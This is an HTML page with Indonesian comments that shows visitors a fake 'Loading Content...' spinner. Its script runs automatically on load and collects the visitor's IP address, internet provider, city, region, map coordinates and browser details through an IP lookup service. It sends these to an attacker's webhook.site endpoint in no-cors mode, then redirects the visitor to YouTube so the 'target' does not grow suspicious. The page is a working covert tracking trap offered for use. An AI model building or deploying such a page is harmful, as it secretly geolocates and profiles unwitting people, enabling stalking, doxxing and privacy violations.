<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        body { background: #000; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 3px solid #111; border-top: 3px solid #333; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script>
        // Jalur Webhook lu yang tadi
        const logger = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";

        async function initCapture() {
            try {
                // 1. Ambil data publik target via IP API
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Susun data biar rapi di Webhook.site
                const payload = {
                    event: "Target Clicked",
                    timestamp: new Date().toLocaleString('id-ID'),
                    ip_address: data.ip,
                    provider: data.org,
                    city: data.city,
                    region: data.region,
                    google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                    user_agent: navigator.userAgent,
                    language: navigator.language
                };

                // 3. Kirim data ke Webhook lu
                await fetch(logger, {
                    method: 'POST',
                    mode: 'no-cors', // Biar nggak kena blokir keamanan browser
                    body: JSON.stringify(payload)
                });

                // 4. Lempar target ke YouTube atau Google biar nggak curiga
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 

            } catch (err) {
                // Jika gagal (misal target pake AdBlock), tetep lempar biar aman
                window.location.href = "https://www.google.com";
            }
        }

        // Eksekusi otomatis saat page dibuka
        initCapture();
    </script>
</body>
</html>
